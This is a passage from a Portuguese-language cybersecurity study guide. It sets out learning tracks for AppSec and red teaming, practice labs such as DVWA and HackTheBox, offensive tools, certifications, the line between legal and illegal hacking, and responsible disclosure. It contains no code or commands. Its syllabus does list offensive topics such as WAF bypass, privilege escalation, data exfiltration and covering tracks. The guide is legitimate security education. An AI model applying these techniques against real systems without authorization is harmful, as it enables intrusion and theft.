└─ Limite: Difícil prever todos os ataques
```

**MINDSET OFENSIVO (HACKER)**
```
"Como eu quebraria este sistema?"
├─ Pensamento: Criativo, investigativo, exploratório
├─ Foco: Encontrar fraquezas
├─ Ferramentas: Burp, Metasploit, Nmap, curl
└─ Benefício: Revela falhas que defesa não vê
```

**MINDSET HÍBRIDO (MAIS EFETIVO)**
```
Ofensivo + Defensivo = Segurança Completa
├─ Entender pensamento do atacante
├─ Implementar controles efetivos
├─ Validar defesas através de testes
└─ Melhoria contínua
```

### 💡 Como Começar a Aprender

**TRILHA 1: Fundações (Semanas 1-4)**
```
Week 1: Redes + Protocolos
├─ OSI Model, TCP/IP, HTTP/HTTPS
├─ Ferramentas: curl, netstat, ping, traceroute
└─ Prática: Requisições HTTP manuais

Week 2: Linux + Shell
├─ Comandos essenciais (ls, cd, grep, find, etc)
├─ Permissões (chmod, chown)
├─ Ferramentas: bash, zsh
└─ Prática: Manipular arquivos, scripts básicos

Week 3: Autenticação + Criptografia
├─ Senhas, tokens, MFA
├─ Hash vs Encryption
├─ RSA, HTTPS, PKI
└─ Prática: Testar com OpenSSL

Week 4: Segurança Web Básica
├─ HTTP Methods, Status Codes
├─ Headers importantes
├─ Input validation
└─ Prática: Fazer requisições com Burp Repeater
```

**TRILHA 2: AppSec Tester (Meses 2-4)**
```
Mês 2: OWASP Top 10
├─ Injection, XSS, CSRF, Broken Auth, etc
├─ Ferramentas: Burp Suite Community
└─ Prática: DVWA, WebGoat, OWASP Juice Shop

Mês 3: Testes Manuais & Automatizados
├─ DAST: ZAP, Burp
├─ SAST: SonarQube, CodeQL, Semgrep
├─ SCA: Snyk, Dependency-Check
└─ Prática: Scan aplicações vulneráveis

Mês 4: Relatórios & Priorização
├─ Severidade e impacto
├─ Escrita técnica
├─ Remediação
└─ Prática: Documentar findings em DVWA
```

**TRILHA 3: Red Team Iniciante (Meses 5-8)**
```
Mês 5: Reconhecimento + Enumeração
├─ OSINT (Google dorking, Shodan, etc)
├─ Nmap, nessus, service enumeration
├─ Ferramentas: Nmap, theHarvester, Shodan
└─ Prática: Scan targets legais (HackTheBox, TryHackMe)

Mês 6: Exploração Web + APIs
├─ SQLi, XSS, IDOR, API attacks
├─ Burp Suite profesional (considerar)
├─ Payloads e bypass WAF
└─ Prática: WebGoat, HackTheBox

Mês 7: Exploração de Infraestrutura
├─ Windows privilege escalation
├─ Linux privilege escalation
├─ Lateral movement
└─ Prática: TryHackMe (easy → medium)

Mês 8: Pós-Exploração + Reporting
├─ Maintaining access, data exfiltration
├─ Covering tracks
├─ Relatórios de pentest reais
└─ Prática: Simular ataque completo
```

### 🛠️ Recursos Práticos para Iniciantes

**PLATAFORMAS GRÁTIS**
```
1. TryHackMe
   └─ Máquinas virtuais pré-configuradas
   └─ Cursos interativos
   └─ Dificuldade: iniciante → avançado

2. HackTheBox
   └─ CTF, máquinas reais
   └─ Comunidade ativa
   └─ Dificuldade: fácil → difícil

3. DVWA (Damn Vulnerable Web App)
   └─ Aplicação web intencionalmente vulnerável
   └─ Ótima para aprender OWASP Top 10
   └─ Download: https://github.com/digininja/DVWA

4. WebGoat
   └─ OWASP project
   └─ Lições interativas de segurança web
   └─ Download: https://github.com/WebGoat/WebGoat

5. OWASP Juice Shop
   └─ E-commerce vulnerável moderno
   └─ CTF challenges
   └─ Download: https://github.com/juice-shop/juice-shop
```

**FERRAMENTAS ESSENCIAIS GRÁTIS**
```
Web Testing:
├─ Burp Suite Community (Free)
├─ OWASP ZAP
├─ Postman (API testing)
└─ Firefox Developer Tools

Network:
├─ Nmap
├─ Wireshark
├─ tcpdump
└─ Netcat

Linux:
├─ Kali Linux (distribuição)
├─ ParrotOS (alternativa)
└─ Ubuntu + ferramentas

Password Testing:
├─ hashcat
├─ John the Ripper
├─ Hydra (brute force)
└─ Medusa
```

**CERTIFICAÇÕES RECOMENDADAS**
```
Para Iniciantes:
├─ CompTIA Security+ (fundações)
├─ Certified Ethical Hacker (CEH)
└─ eJPT (eLearnSecurity Junior Pentest)

Intermediários:
├─ Offensive Security Certified Professional (OSCP)
├─ GIACP (GIAC Certified AppSec Professional)
└─ GWAPT (GIAC Web Application Penetration Tester)

Especializados:
├─ CRTE (Certified Red Team Operator)
├─ CRTP (Certified Red Team Professional)
└─ GPEN (GIAC Penetration Tester)
```

### 📚 Mentalidade Ética

**HACKING LEGAL vs ILEGAL**

```
LEGAL ✅
├─ Pentesting autorizado (contrato)
├─ Bug bounty programs
├─ CTF competitions
├─ Laboratórios pessoais
├─ Estudo em plataformas legítimas (HackTheBox, TryHackMe)
└─ Pesquisa de segurança responsável

ILEGAL ❌
├─ Acessar sistema sem autorização
├─ Instalar malware
├─ Roubar dados
├─ DDoS
├─ Extorsão
└─ Qualquer ataque não-autorizado
```

**DIVULGAÇÃO RESPONSÁVEL (RESPONSIBLE DISCLOSURE)**

```
Se você encontrar uma vulnerabilidade:

1. NÃO publicar exploit publicamente
2. Contatar a empresa:
   ├─ Procurar security.txt
   ├─ Procurar página de bug bounty
   ├─ Email: security@company.com
   └─ Telefonar se necessário

3. Dar prazo razoável (90 dias):
   ├─ Empresa fixa bug
   ├─ Testa patch
   ├─ Lança update

4. Depois de patched:
   ├─ Pode publicar blog post
   ├─ Pode reportar a CVE
   └─ Reconhecimento público

Benefícios:
├─ Melhora segurança
├─ Pode ganhar bug bounty ($)
├─ Construir reputação
└─ Evitar problemas legais
```

---

## 🎯 Próximos Passos

### 1. **Escolha uma Trilha**
- AppSec Tester (Web Security Focus)
- Red Team (Hacking Focus)
- DevSecOps (Security Engineering)

### 2. **Comece pelo Básico**
- Fundações de rede
- Linux + shell scripting
- HTTP + Web

### 3. **Pratique Constantemente**
- TryHackMe, HackTheBox
- DVWA, WebGoat, Juice Shop
- Construa seu próprio lab

### 4. **Estude OWASP Top 10**
- Entenda cada vulnerabilidade
- Teste manualmente
- Automatize com ferramentas

### 5. **Construa Portfolio**
- Crie documentação
- Participe de CTFs
- Publique em blog/GitHub
- Bug bounty (se experiente)

---

## 📚 Referências Finais

### Documentação Oficial
- [OWASP Foundation](https://owasp.org/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [RFC Series](https://tools.ietf.org/html/)

### Cursos Online
- [TryHackMe](https://tryhackme.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

### Livros Recomendados
- "The Web Application Hacker's Handbook" (Stuttard & Pinto)
- "Penetration Testing" (Georgia Weidman)
- "The Hacker Playbook" (Peter Kim)
- "Red Team Field Manual" (RTFM)

### Podcasts & Comunidades
- [Security Now!](https://twit.tv/shows/security-now) - Steve Gibson
- [The Cybrary](https://www.cybrary.it/) - Comunidade
- [OWASP Community](https://owasp.org/www-community/)
- Reddit: r/cybersecurity, r/netsec, r/learnhacking

---

<div align="center">

**⭐ Comece simples, progrida consistentemente**

**A segurança é uma jornada, não um destino**

</div>
